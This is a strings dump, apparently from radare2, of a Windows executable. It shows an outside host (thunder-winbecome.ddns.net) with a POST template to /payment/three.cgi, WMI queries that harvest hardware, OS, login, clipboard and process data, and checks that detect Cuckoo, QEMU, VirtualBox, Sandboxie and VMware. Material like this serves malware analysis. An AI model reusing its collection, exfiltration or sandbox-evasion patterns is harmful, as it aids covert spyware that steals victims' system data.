[Strings]
nth  paddr      vaddr      len size section  type    string
316  0x00005d51 0x00406951 4   5    .text    ascii   D$\bk
317  0x00005ebe 0x00406abe 4   5    .text    ascii   XXX\n
318  0x00005ec5 0x00406ac5 4   5    .text    ascii   ANNI
319  0x00005eca 0x00406aca 6   7    .text    ascii   @\bE-DA
320  0x00005ed1 0x00406ad1 7   8    .text    ascii   @\fEMONf
321  0x00005fe1 0x00406be1 4   5    .text    ascii   D$\f~
322  0x00005fe9 0x00406be9 4   5    .text    ascii   D$\bk
323  0x000060b1 0x00406cb1 4   5    .text    ascii   XXX\n
324  0x000060b8 0x00406cb8 4   5    .text    ascii   ANNI
325  0x000060bd 0x00406cbd 6   7    .text    ascii   @\bE-DA
326  0x000060c4 0x00406cc4 7   8    .text    ascii   @\fEMONf
327  0x000061bc 0x00406dbc 4   5    .text    ascii   D$\b7
328  0x00006222 0x00406e22 4   5    .text    ascii   D$\b7
329  0x0000631c 0x00406f1c 4   6    .text    utf8    \tD$\b
330  0x00006348 0x00406f48 4   6    .text    utf8    \tD$\b
331  0x0000639a 0x00406f9a 4   5    .text    ascii   D$\b\a
332  0x00006400 0x00407000 4   5    .text    ascii   D$\b\t
333  0x00006428 0x00407028 4   5    .text    ascii   D$\b\v
334  0x0000649d 0x0040709d 4   5    .text    ascii   D$\b\t
335  0x0000681a 0x0040741a 4   6    .text    utf8    \tD$\b
336  0x00006888 0x00407488 4   6    .text    utf8    \tD$\b
337  0x00006998 0x00407598 4   6    .text    utf8    E܉D$ blocks=Basic Latin,Syriac
338  0x000069cb 0x004075cb 5   7    .text    utf8    E܉D$\b blocks=Basic Latin,Syriac
339  0x00006ac7 0x004076c7 4   6    .text    utf8    Љ\$\b blocks=Cyrillic,Basic Latin
340  0x00006c68 0x00407868 4   6    .text    utf8    \tD$\f
341  0x00006cbb 0x004078bb 4   5    .text    ascii   D$\b\a
342  0x00006ccc 0x004078cc 4   5    .text    ascii   $@\bA
343  0x00006ce3 0x004078e3 4   5    .text    ascii   D$\b\a
344  0x00006cf4 0x004078f4 4   5    .text    ascii   $H\bA
345  0x00006d0b 0x0040790b 4   5    .text    ascii   D$\b\t
346  0x00006d1c 0x0040791c 4   5    .text    ascii   $P\bA
347  0x00006d33 0x00407933 4   5    .text    ascii   D$\b\r
348  0x00006d44 0x00407944 4   5    .text    ascii   $Z\bA
349  0x00006d5b 0x0040795b 4   5    .text    ascii   D$\b\f
350  0x00006d6c 0x0040796c 4   5    .text    ascii   $h\bA
351  0x00006d83 0x00407983 4   5    .text    ascii   D$\b\v
352  0x00006d94 0x00407994 4   5    .text    ascii   $u\bA
353  0x00006dab 0x004079ab 4   5    .text    ascii   D$\b\f
354  0x00006dd3 0x004079d3 4   5    .text    ascii   D$\b\v
355  0x00006dfb 0x004079fb 4   5    .text    ascii   D$\b\b
356  0x00006e23 0x00407a23 4   5    .text    ascii   D$\b\t
357  0x00006e48 0x00407a48 4   5    .text    ascii   D$\b\n
358  0x00006e6d 0x00407a6d 4   5    .text    ascii   D$\b\v
359  0x00006f64 0x00407b64 4   5    .text    ascii   D$\b\f
360  0x00007011 0x00407c11 4   6    .text    utf8    Љ\$\b blocks=Cyrillic,Basic Latin
361  0x00007538 0x00408138 4   5    .text    ascii   [^_]
362  0x00007629 0x00408229 5   6    .text    ascii   |[^_]
363  0x00007876 0x00408476 4   5    .text    ascii   $\f\nA
364  0x00007924 0x00408524 4   6    .text    utf8    )ǋE\f blocks=Basic Latin,Latin Extended-B
365  0x0000794f 0x0040854f 4   6    .text    utf8    )ƋE\f blocks=Basic Latin,Latin Extended-B
366  0x000079e9 0x004085e9 4   6    .text    utf8    )ËE\f blocks=Basic Latin,Latin-1 Supplement
367  0x00007a14 0x00408614 4   6    .text    utf8    )KE\f
368  0x00007a67 0x00408667 4   5    .text    ascii   [^_]
369  0x00007a92 0x00408692 4   5    .text    ascii   E\b)E
370  0x00007b5d 0x0040875d 7   10   .text    utf8    E\vUĉD$\b blocks=Basic Latin,Latin Extended-A
371  0x00007b7e 0x0040877e 7   10   .text    utf8    E؋U܉D$\b blocks=Basic Latin,Arabic,Syriac
372  0x00007d9d 0x0040899d 5   7    .text    utf8    EЉD$\f blocks=Basic Latin,Cyrillic
373  0x0000823b 0x00408e3b 4   5    .text    ascii   D$\b\a
374  0x0000824c 0x00408e4c 4   5    .text    ascii   $O\rA
375  0x0000827f 0x00408e7f 4   5    .text    ascii   D$\b\b
376  0x00008290 0x00408e90 4   5    .text    ascii   $W\rA
377  0x000082a7 0x00408ea7 4   5    .text    ascii   D$\b\n
378  0x000082b8 0x00408eb8 4   5    .text    ascii   $`\rA
379  0x000082e0 0x00408ee0 4   5    .text    ascii   $k\rA
380  0x000082f7 0x00408ef7 4   5    .text    ascii   D$\b\b
381  0x00008308 0x00408f08 4   5    .text    ascii   $|\rA
382  0x0000831f 0x00408f1f 4   5    .text    ascii   D$\b\a
383  0x00008347 0x00408f47 4   5    .text    ascii   D$\b\b
384  0x0000836f 0x00408f6f 4   5    .text    ascii   D$\b\v
385  0x00008397 0x00408f97 4   5    .text    ascii   D$\b\a
386  0x000083bf 0x00408fbf 4   5    .text    ascii   D$\b\v
387  0x000083e7 0x00408fe7 4   5    .text    ascii   D$\b\v
388  0x0000840f 0x0040900f 4   5    .text    ascii   D$\b\b
389  0x00008437 0x00409037 4   5    .text    ascii   D$\b\b
390  0x000084af 0x004090af 4   5    .text    ascii   D$\b\t
391  0x000084d7 0x004090d7 4   5    .text    ascii   D$\b\n
392  0x000084ff 0x004090ff 4   5    .text    ascii   D$\b\a
393  0x0000854f 0x0040914f 4   5    .text    ascii   D$\b\v
394  0x00008577 0x00409177 4   5    .text    ascii   D$\b\r
395  0x000086f9 0x004092f9 4   5    .text    ascii   D$\b"
396  0x0000873b 0x0040933b 4   5    .text    ascii   D$\f\b
397  0x0000882a 0x0040942a 4   5    .text    ascii   Soft
398  0x00008831 0x00409431 4   5    .text    ascii   ware
399  0x00008836 0x00409436 6   7    .text    ascii   @\b\Ado
400  0x0000883d 0x0040943d 6   7    .text    ascii   @\fbe\A
401  0x00008846 0x00409446 4   5    .text    ascii   crob
402  0x0000884d 0x0040944d 4   5    .text    ascii   at R
403  0x00008854 0x00409454 5   6    .text    ascii   eadef
404  0x000088a1 0x004094a1 4   5    .text    ascii   \AVG
405  0x000088a8 0x004094a8 4   5    .text    ascii   ener
406  0x000088ad 0x004094ad 6   7    .text    ascii   @\bal\c
407  0x000088b4 0x004094b4 6   7    .text    ascii   @\fRece
408  0x000088bd 0x004094bd 4   5    .text    ascii   ntFi
409  0x000088d3 0x004094d3 4   5    .text    ascii   D$\f\b
410  0x000089eb 0x004095eb 4   5    .text    ascii   D$\b0
411  0x00008c95 0x00409895 4   5    .text    ascii   D$\b\t
412  0x00008d1c 0x0040991c 4   5    .text    ascii   D$\b\t
413  0x00008d49 0x00409949 4   6    .text    utf8    EԉD$ blocks=Basic Latin,Cyrillic Supplement
414  0x00008d89 0x00409989 4   5    .text    ascii   D$\b\t
415  0x00008dd1 0x004099d1 7   10   .text    utf8    EԍU؉T$  blocks=Basic Latin,Cyrillic Supplement,Arabic
416  0x00008e2a 0x00409a2a 4   5    .text    ascii   D$\b\t
417  0x00008e95 0x00409a95 6   9    .text    utf8    E؍UЉT$ blocks=Basic Latin,Arabic,Cyrillic
418  0x00008ed5 0x00409ad5 4   5    .text    ascii   D$\b\t
419  0x00008f16 0x00409b16 6   9    .text    utf8    EЍUĉT$ blocks=Basic Latin,Cyrillic,Latin Extended-A
420  0x00008f20 0x00409b20 5   7    .text    utf8    UȉT$\f blocks=Basic Latin,Latin Extended-B
421  0x00008f3f 0x00409b3f 4   7    .text    utf8    E܋Eą blocks=Basic Latin,Syriac,Latin Extended-A
422  0x00008f7c 0x00409b7c 4   6    .text    utf8    M̉L$ blocks=Basic Latin,Combining Diacritical Marks
423  0x00008f9e 0x00409b9e 4   7    .text    utf8    E܋Ẽ blocks=Basic Latin,Syriac,Combining Diacritical Marks
424  0x0000935b 0x00409f5b 4   5    .text    ascii   <-u\e
425  0x000093a0 0x00409fa0 5   6    .text    ascii   ;E\fwp
426  0x000093ba 0x00409fba 4   6    .text    utf8    ʉD$\b blocks=IPA Extensions,Basic Latin
427  0x000093dc 0x00409fdc 5   6    .text    ascii   ;E\fs\v
428  0x000093fb 0x00409ffb 4   5    .text    ascii   ;E\fs
429  0x0000942a 0x0040a02a 4   5    .text    ascii   < t"
430  0x00009492 0x0040a092 4   7    .text    utf8    \tӉ؉E blocks=Basic Latin,Cyrillic,Arabic
431  0x000094bf 0x0040a0bf 4   7    .text    utf8    \tӉ؉E blocks=Basic Latin,Cyrillic,Arabic
432  0x000094d4 0x0040a0d4 4   5    .text    ascii    [^]
433  0x00009507 0x0040a107 4   7    .text    utf8    \tӉ؉E blocks=Basic Latin,Cyrillic,Arabic
434  0x0000953b 0x0040a13b 4   7    .text    utf8    \tӉ؉E blocks=Basic Latin,Cyrillic,Arabic
435  0x00009550 0x0040a150 4   5    .text    ascii    [^]
436  0x00009db2 0x0040a9b2 4   6    .text    utf8    U܉T$ blocks=Basic Latin,Syriac
437  0x00009dc0 0x0040a9c0 4   5    .text    ascii   D$\b\n
438  0x0000a2f0 0x0040aef0 4   5    .text    ascii   UWVS
439  0x0000a31c 0x0040af1c 8   10   .text    utf8    ,[^_]ÍD$ blocks=Basic Latin,Latin-1 Supplement
440  0x0000a389 0x0040af89 6   8    .text    utf8    ,[^_]Ð blocks=Basic Latin,Latin-1 Supplement
441  0x0000a48c 0x0040b08c 5   6    .text    ascii   D$$t\n
442  0x0000a523 0x0040b123 5   6    .text    ascii   D$Xt)
443  0x0000a529 0x0040b129 4   6    .text    utf8    ʋT$@ blocks=IPA Extensions,Basic Latin
444  0x0000a60a 0x0040b20a 4   5    .text    ascii   D$\b\e
445  0x0000a667 0x0040b267 4   5    .text    ascii   5 TA
446  0x0000a675 0x0040b275 4   5    .text    ascii   =$TA
447  0x0000a6b6 0x0040b2b6 4   5    .text    ascii   5$TA
448  0x0000a71c 0x0040b31c 4   5    .text    ascii   D$\b@
449  0x0000a748 0x0040b348 4   5    .text    ascii   0[^_
450  0x0000a7e4 0x0040b3e4 4   6    .text    utf8    )čD$ blocks=Basic Latin,Latin Extended-A
451  0x0000a8a3 0x0040b4a3 5   7    .text    utf8    [^_]û blocks=Basic Latin,Latin-1 Supplement
452  0x0000a8e0 0x0040b4e0 5   7    .text    utf8    rӡ TA blocks=Basic Latin,Cyrillic
453  0x0000a939 0x0040b539 5   7    .text    utf8    EȉD$\f blocks=Basic Latin,Latin Extended-B
454  0x0000a94c 0x0040b54c 4   6    .text    utf8    E؉D$ blocks=Basic Latin,Arabic
455  0x0000aa1f 0x0040b61f 6   9    .text    utf8    >롋\r$TA blocks=Basic Latin,Hangul Syllables
456  0x0000ac00 0x0040b800 4   5    .text    ascii   UWVS
457  0x0000ac09 0x0040b809 4   5    .text    ascii   $8TA
458  0x0000ac24 0x0040b824 4   5    .text    ascii   =@dA
459  0x0000ac57 0x0040b857 4   5    .text    ascii   $8TA
460  0x0000ac68 0x0040b868 6   8    .text    utf8    [^_]Ív blocks=Basic Latin,Latin-1 Supplement
461  0x0000aca4 0x0040b8a4 4   5    .text    ascii   $8TA
462  0x0000acc8 0x0040b8c8 4   5    .text    ascii   $8TA
463  0x0000ad12 0x0040b912 4   5    .text    ascii   $8TA
464  0x0000ad43 0x0040b943 4   5    .text    ascii   $8TA
465  0x0000ad70 0x0040b970 4   5    .text    ascii   $8TA
466  0x0000ad7f 0x0040b97f 4   7    .text    utf8    щЋR\b blocks=Cyrillic,Basic Latin
467  0x0000add5 0x0040b9d5 5   7    .text    utf8    uޡ0TA blocks=Basic Latin,Thaana
468  0x0000ae07 0x0040ba07 4   5    .text    ascii   $8TA
469  0x0000ae42 0x0040ba42 4   5    .text    ascii   $8TA
470  0x0000ae96 0x0040ba96 4   5    .text    ascii   8MZt
471  0x0000aecb 0x0040bacb 4   6    .text    utf8    t\e1ɐ blocks=Basic Latin,IPA Extensions
472  0x0000aeea 0x0040baea 4   6    .text    utf8    [^Ív blocks=Basic Latin,Latin-1 Supplement
473  0x0000aef0 0x0040baf0 5   6    .text    ascii   UWVS1
474  0x0000af07 0x0040bb07 4   5    .text    ascii   \bw\vf
475  0x0000af11 0x0040bb11 4   5    .text    ascii   MZt\v
476  0x0000af1a 0x0040bb1a 5   7    .text    utf8    [^_]Ð blocks=Basic Latin,Latin-1 Supplement
477  0x0000af5b 0x0040bb5b 4   5    .text    ascii   D$\b\b
478  0x0000af79 0x0040bb79 4   5    .text    ascii   [^_]
479  0x0000af88 0x0040bb88 6   8    .text    utf8    ^_]Ít& blocks=Basic Latin,Latin-1 Supplement
480  0x0000b01e 0x0040bc1e 5   6    .text    ascii   \$\ft\r
481  0x0000b061 0x0040bc61 5   6    .text    ascii   B' t\a
482  0x0000b13c 0x0040bd3c 4   6    .text    utf8    [^_ø blocks=Basic Latin,Latin-1 Supplement
483  0x0000b15b 0x0040bd5b 4   6    .text    utf8    tډ\$ blocks=Basic Latin,Arabic
484  0x0000b179 0x0040bd79 4   7    .text    utf8    u\v뺍v blocks=Basic Latin,Hangul Syllables
485  0x0000b1b7 0x0040bdb7 4   6    .text    utf8    [^_Ð blocks=Basic Latin,Latin-1 Supplement
486  0x0000b1c8 0x0040bdc8 4   5    .text    ascii   L$\fr
487  0x0000b1f0 0x0040bdf0 4   5    .text    ascii   UWVS
488  0x0000b243 0x0040be43 5   7    .text    utf8    [^_]Ð blocks=Basic Latin,Latin-1 Supplement
489  0x0000b278 0x0040be78 4   6    .text    utf8    ىD$\f blocks=Arabic,Basic Latin
490  0x0000b27e 0x0040be7e 4   6    .text    utf8    ՋD$\b blocks=Armenian,Basic Latin
491  0x0000b29a 0x0040be9a 4   5    .text    ascii   d$\f9
492  0x0000b2bd 0x0040bebd 4   5    .text    ascii   [^_]
493  0x0000b2cd 0x0040becd 5   7    .text    utf8    [^_]É blocks=Basic Latin,Latin-1 Supplement
494  0x0000b2e1 0x0040bee1 6   8    .text    utf8    [^_]Ív blocks=Basic Latin,Latin-1 Supplement
495  0x0000b2f6 0x0040bef6 4   5    .text    ascii   ;D$\b
496  0x0000b33c 0x0040bf3c 4   5    .text    ascii   D$\b@
497  0x0000b370 0x0040bf70 4   5    .text    ascii   UWVS
498  0x0000b4e3 0x0040c0e3 5   7    .text    utf8    [^_]Ð blocks=Basic Latin,Latin-1 Supplement
499  0x0000b503 0x0040c103 5   7    .text    utf8    [^_]Ð blocks=Basic Latin,Latin-1 Supplement
500  0x0000b5e7 0x0040c1e7 4   6    .text    utf8    t/ǃ( blocks=Basic Latin,Latin Extended-B
501  0x0000b75f 0x0040c35f 4   5    .text    ascii   |_t-
502  0x0000b7ba 0x0040c3ba 4   6    .text    utf8    [^Ív blocks=Basic Latin,Latin-1 Supplement
503  0x0000b7e0 0x0040c3e0 4   5    .text    ascii   UWVS
504  0x0000b89a 0x0040c49a 5   6    .text    ascii   \[^_]
505  0x0000b8a4 0x0040c4a4 6   7    .text    ascii   </t\b<\
506  0x0000ba89 0x0040c689 4   5    .text    ascii   %|eA
507  0x0000ba91 0x0040c691 4   5    .text    ascii   %xeA
508  0x0000ba99 0x0040c699 4   5    .text    ascii   %teA
509  0x0000baa1 0x0040c6a1 4   5    .text    ascii   %peA
510  0x0000baa9 0x0040c6a9 4   5    .text    ascii   %leA
511  0x0000bab1 0x0040c6b1 4   5    .text    ascii   %heA
512  0x0000bab9 0x0040c6b9 4   5    .text    ascii   %deA
513  0x0000bac1 0x0040c6c1 4   5    .text    ascii   %`eA
514  0x0000bac9 0x0040c6c9 4   5    .text    ascii   %\eA
515  0x0000bad1 0x0040c6d1 4   5    .text    ascii   %XeA
516  0x0000bad9 0x0040c6d9 4   5    .text    ascii   %TeA
517  0x0000bae1 0x0040c6e1 4   5    .text    ascii   %PeA
518  0x0000bae9 0x0040c6e9 4   5    .text    ascii   %LeA
519  0x0000baf1 0x0040c6f1 4   5    .text    ascii   %HeA
520  0x0000baf9 0x0040c6f9 4   5    .text    ascii   %DeA
521  0x0000bb01 0x0040c701 4   5    .text    ascii   %<eA
522  0x0000bb09 0x0040c709 4   5    .text    ascii   %4eA
523  0x0000bb11 0x0040c711 4   5    .text    ascii   %0eA
524  0x0000bb19 0x0040c719 4   5    .text    ascii   %(eA
525  0x0000bb21 0x0040c721 4   5    .text    ascii   %$eA
526  0x0000bb29 0x0040c729 4   5    .text    ascii   % eA
527  0x0000bb49 0x0040c749 4   5    .text    ascii   %\feA
528  0x0000bb51 0x0040c751 4   5    .text    ascii   %\beA
529  0x0000bba9 0x0040c7a9 4   5    .text    ascii   %\bdA
530  0x0000be00 0x0040e000 18  19   .rdata   ascii   libgcc_s_dw2-1.dll
531  0x0000be13 0x0040e013 21  22   .rdata   ascii   __register_frame_info
532  0x0000be29 0x0040e029 23  24   .rdata   ascii   __deregister_frame_info
533  0x0000be41 0x0040e041 13  14   .rdata   ascii   libgcj-16.dll
534  0x0000be4f 0x0040e04f 19  20   .rdata   ascii   _Jv_RegisterClasses
535  0x0000be64 0x0040e064 6   7    .rdata   ascii   150006
536  0x0000be6b 0x0040e06b 18  19   .rdata   ascii   /payment/three.cgi
537  0x0000be7e 0x0040e07e 26  27   .rdata   ascii   thunder-winbecome.ddns.net
538  0x0000be9c 0x0040e09c 151 152  .rdata   ascii   POST %s HTTP/1.1\r\nHost: %s\r\nUser-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows XP)\r\nReferer: http://%s%s\r\nCokkie: xtl_s=%s\r\nContent-Length: 207\r\n\r\n
539  0x0000bf36 0x0040e136 17  18   .rdata   ascii   XXX\nANNIE-DAEMON\n
540  0x0000bf4a 0x0040e14a 17  18   .rdata   ascii   .\Sagittarius.txt
541  0x0000bf64 0x0040e164 55  56   .rdata   ascii   <System up time>\nContinuous operation time: %lu msec.\n\n
542  0x0000bf9c 0x0040e19c 25  26   .rdata   ascii   <Sample path & meta data>
543  0x0000bfb7 0x0040e1b7 16  17   .rdata   ascii   <Start up list>\n
544  0x0000bfc8 0x0040e1c8 24  25   .rdata   ascii   <Desktop customization>\n
545  0x0000bfe1 0x0040e1e1 22  23   .rdata   ascii   <File access history>\n
546  0x0000bff8 0x0040e1f8 20  21   .rdata   ascii   <Path of wallpaper>\n
547  0x0000c00d 0x0040e20d 16  17   .rdata   ascii   <Adobe history>\n
548  0x0000c01e 0x0040e21e 8   18   .rdata   utf16le DeviceId
549  0x0000c030 0x0040e230 21  44   .rdata   utf16le PCI\VEN_80EE&DEV_CAFE
550  0x0000c05c 0x0040e25c 14  15   .rdata   ascii   .\Scorpius.txt
551  0x0000c06c 0x0040e26c 9   20   .rdata   utf16le \nDeviceID
552  0x0000c080 0x0040e280 4   10   .rdata   utf16le name
553  0x0000c08c 0x0040e28c 20  42   .rdata   utf16le NumberOfFunctionKeys
554  0x0000c0b6 0x0040e2b6 6   14   .rdata   utf16le Layout
555  0x0000c0c4 0x0040e2c4 12  26   .rdata   utf16le Manufacturer
556  0x0000c0de 0x0040e2de 12  26   .rdata   utf16le HardwareType
557  0x0000c0f8 0x0040e2f8 25  52   .rdata   utf16le CurrentVerticalResolution
558  0x0000c12c 0x0040e32c 27  56   .rdata   utf16le CurrentHorizontalResolution
559  0x0000c164 0x0040e364 11  24   .rdata   utf16le MonitorType
560  0x0000c17c 0x0040e37c 12  26   .rdata   utf16le ScreenHeight
561  0x0000c196 0x0040e396 11  24   .rdata   utf16le ScreenWidth
562  0x0000c1b0 0x0040e3b0 19  40   .rdata   utf16le MonitorManufacturer
563  0x0000c1d8 0x0040e3d8 4   10   .rdata   utf16le Name
564  0x0000c1e2 0x0040e3e2 7   16   .rdata   utf16le Product
565  0x0000c1f2 0x0040e3f2 7   16   .rdata   utf16le Version
566  0x0000c202 0x0040e402 12  26   .rdata   utf16le SerialNumber
567  0x0000c21c 0x0040e41c 11  24   .rdata   utf16le ReleaseDate
568  0x0000c234 0x0040e434 17  36   .rdata   utf16le SMBIOSBIOSVersion
569  0x0000c258 0x0040e458 11  24   .rdata   utf16le InstallDate
570  0x0000c270 0x0040e470 14  30   .rdata   utf16le RegisteredUser
571  0x0000c28e 0x0040e48e 6   14   .rdata   utf16le Locale
572  0x0000c29c 0x0040e49c 13  28   .rdata   utf16le TimeGenerated
573  0x0000c2b8 0x0040e4b8 11  12   .rdata   ascii   <keyboard>\n
574  0x0000c2c4 0x0040e4c4 28  58   .rdata   utf16le SELECT * FROM Win32_keyboard
575  0x0000c306 0x0040e506 10  22   .rdata   utf16le ROOT\CIMV2
576  0x0000c31c 0x0040e51c 8   9    .rdata   ascii   <mouse>\n
577  0x0000c328 0x0040e528 34  70   .rdata   utf16le SELECT * FROM Win32_PointingDevice
578  0x0000c36e 0x0040e56e 13  14   .rdata   ascii   <video card>\n
579  0x0000c37c 0x0040e57c 35  72   .rdata   utf16le SELECT * FROM Win32_VideoController
580  0x0000c3c4 0x0040e5c4 18  19   .rdata   ascii   <desktop monitor>\n
581  0x0000c3d8 0x0040e5d8 34  70   .rdata   utf16le SELECT * FROM Win32_DesktopMonitor
582  0x0000c41e 0x0040e61e 6   7    .rdata   ascii   <usb>\n
583  0x0000c428 0x0040e628 58  118  .rdata   utf16le SELECT * FROM Win32_PnPEntity WHERE DeviceID like '%USB%' 
584  0x0000c49e 0x0040e69e 15  16   .rdata   ascii   <mother board>\n
585  0x0000c4b0 0x0040e6b0 29  60   .rdata   utf16le SELECT * FROM Win32_BaseBoard
586  0x0000c4ec 0x0040e6ec 7   8    .rdata   ascii   <bios>\n
587  0x0000c4f4 0x0040e6f4 24  50   .rdata   utf16le SELECT * FROM Win32_BIOS
588  0x0000c526 0x0040e726 5   6    .rdata   ascii   <os>\n
589  0x0000c52c 0x0040e72c 35  72   .rdata   utf16le SELECT * FROM Win32_OperatingSystem
590  0x0000c574 0x0040e774 16  17   .rdata   ascii   <login history>\n
591  0x0000c588 0x0040e788 74  150  .rdata   utf16le SELECT * FROM Win32_NTLogEvent WHERE logfile='system' And EventCode='6005'
592  0x0000c61e 0x0040e81e 21  22   .rdata   ascii   <emulator detection>\n
593  0x0000c634 0x0040e834 47  48   .rdata   ascii     [*] Detect by checking for VBox devices  ... 
594  0x0000c664 0x0040e864 10  22   .rdata   utf16le root\cimv2
595  0x0000c67a 0x0040e87a 6   7    .rdata   ascii   FALSE\n
596  0x0000c684 0x0040e884 36  74   .rdata   utf16le SELECT DeviceId FROM Win32_PnPEntity
597  0x0000c6ce 0x0040e8ce 5   6    .rdata   ascii   TRUE\n
598  0x0000c6d4 0x0040e8d4 53  54   .rdata   ascii     [*] Detect by looking for VMware serial number ... 
599  0x0000c70c 0x0040e90c 35  72   .rdata   utf16le SELECT SerialNumber FROM Win32_Bios
600  0x0000c754 0x0040e954 6   14   .rdata   utf16le VMware
601  0x0000c762 0x0040e962 14  15   .rdata   ascii   .\Circinus.txt
602  0x0000c774 0x0040e974 32  33   .rdata   ascii   <IP, MAC, Default Gateway, DNS>\n
603  0x0000c795 0x0040e995 13  14   .rdata   ascii   \n<Port List>\n
604  0x0000c7a3 0x0040e9a3 12  13   .rdata   ascii   \n<ARP List>\n
605  0x0000c7b0 0x0040e9b0 14  15   .rdata   ascii   .\Aquarius.txt
606  0x0000c7c2 0x0040e9c2 19  20   .rdata   ascii   <Application list>\n
607  0x0000c7d6 0x0040e9d6 4   5    .rdata   ascii   .exe
608  0x0000c7db 0x0040e9db 16  17   .rdata   ascii   C:\Program Files
609  0x0000c7ec 0x0040e9ec 11  12   .rdata   ascii   .\Orion.txt
610  0x0000c7fb 0x0040e9fb 17  18   .rdata   ascii   \n<OS product ID>\n
611  0x0000c80d 0x0040ea0d 22  23   .rdata   ascii   <System manufacturer>\n
612  0x0000c824 0x0040ea24 13  14   .rdata   ascii   <OS Version>\n
613  0x0000c832 0x0040ea32 15  16   .rdata   ascii   <# Processors>\n
614  0x0000c842 0x0040ea42 9   10   .rdata   ascii   <Memory>\n
615  0x0000c84c 0x0040ea4c 7   8    .rdata   ascii   <Disk>\n
616  0x0000c854 0x0040ea54 21  22   .rdata   ascii   <# Icons of Desktop>\n
617  0x0000c86a 0x0040ea6a 16  17   .rdata   ascii   <System locale>\n
618  0x0000c87b 0x0040ea7b 12  13   .rdata   ascii   <Time zone>\n
619  0x0000c888 0x0040ea88 13  14   .rdata   ascii   <Resolution>\n
620  0x0000c896 0x0040ea96 15  16   .rdata   ascii   <Process list>\n
621  0x0000c8a6 0x0040eaa6 13  14   .rdata   ascii   <Clip board>\n
622  0x0000c8b4 0x0040eab4 12  13   .rdata   ascii   .\Pisces.txt
623  0x0000c8c4 0x0040eac4 45  46   .rdata   ascii   Sandbox detected 'TRUE', undetected 'FALSE'\n\n
624  0x0000c8f2 0x0040eaf2 21  22   .rdata   ascii   [-] Cuckoo detection\n
625  0x0000c908 0x0040eb08 93  94   .rdata   ascii     [*] Detect by cuckoo return address is stored in the TLS (hooks information structure) ... 
626  0x0000c968 0x0040eb68 142 143  .rdata   ascii        Cuckoo stores the return address in an extra space, allocated in the hook information structure FS: TLS_HOOK_INFO (Thread Local Storage)\n
627  0x0000c9f8 0x0040ebf8 206 207  .rdata   ascii        Therefor read the address of hook information and calculate the min and max value for the return address value location. Also FireEye use cuckoo https://github.com/David-Reguera-Garcia-Dreg/anticuckoo\n
628  0x0000cac7 0x0040ecc7 19  20   .rdata   ascii   [-] Qemu detection\n
629  0x0000cadc 0x0040ecdc 42  43   .rdata   ascii     [*] Reg key Scsi identifier is QEMU ... 
630  0x0000cb07 0x0040ed07 4   5    .rdata   ascii   QEMU
631  0x0000cb0c 0x0040ed0c 10  11   .rdata   ascii   Identifier
632  0x0000cb18 0x0040ed18 76  77   .rdata   ascii   HARDWARE\DEVICEMAP\Scsi\Scsi Port 0\Scsi Bus 0\Target Id 0\Logical Unit Id 0
633  0x0000cb68 0x0040ed68 81  82   .rdata   ascii     [*] Reg key (HKLM\HARDWARE\Description\System "SystemBiosVersion") is QEMU ... 
634  0x0000cbba 0x0040edba 17  18   .rdata   ascii   SystemBiosVersion
635  0x0000cbcc 0x0040edcc 27  28   .rdata   ascii   HARDWARE\Description\System
636  0x0000cbe8 0x0040ede8 24  25   .rdata   ascii   [-] Sandboxie detection\n
637  0x0000cc04 0x0040ee04 56  57   .rdata   ascii     [*] Using GetModuleHandle() to search sbiedll.dll ... 
638  0x0000cc3d 0x0040ee3d 11  12   .rdata   ascii   sbiedll.dll
639  0x0000cc49 0x0040ee49 19  20   .rdata   ascii   [-] VBox detection\n
640  0x0000cc60 0x0040ee60 42  43   .rdata   ascii     [*] Reg key Scsi identifier is VBOX ... 
641  0x0000cc8b 0x0040ee8b 4   5    .rdata   ascii   VBOX
642  0x0000cc90 0x0040ee90 80  81   .rdata   ascii     [*] Reg key (HKLM\HARDWARE\Description\System "SystemBiosVersion") is VBOX... 
643  0x0000cce4 0x0040eee4 68  69   .rdata   ascii     [*] Reg key (HKLM\SOFTWARE\Oracle\VirtualBox Guest Additions) ... 
644  0x0000cd2c 0x0040ef2c 42  43   .rdata   ascii   SOFTWARE\Oracle\VirtualBox Guest Additions
645  0x0000cd58 0x0040ef58 85  86   .rdata   ascii     [*] Reg key (HKLM\HARDWARE\Description\System "VideoBiosVersion") is VIRTUALBOX... 
646  0x0000cdae 0x0040efae 10  11   .rdata   ascii   VIRTUALBOX
647  0x0000cdb9 0x0040efb9 16  17   .rdata   ascii   VideoBiosVersion
648  0x0000cdcc 0x0040efcc 51  52   .rdata   ascii     [*] Reg key (HKLM\HARDWARE\ACPI\DSDT\VBOX__) ... 
